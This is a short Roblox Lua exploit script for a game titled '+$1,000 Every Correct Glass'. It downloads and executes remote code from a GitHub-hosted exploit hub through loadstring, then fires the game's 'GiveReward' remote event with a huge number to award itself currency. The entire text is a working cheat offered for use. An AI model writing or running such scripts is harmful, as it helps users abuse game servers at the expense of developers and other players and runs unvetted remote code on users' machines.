local Hub = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Leofreddare/LelSploit/main/LelHub/u.luau"))()("+$1,000 Every Correct Glass")
local LelUI = Hub.Native
local Instance = LelUI.Instance
task.spawn(function()
local args = {
	"9999999999999999999"
}
game:GetService("ReplicatedStorage"):WaitForChild("CratesUtilities"):WaitForChild("Remotes"):WaitForChild("GiveReward"):FireServer(unpack(args))

end)
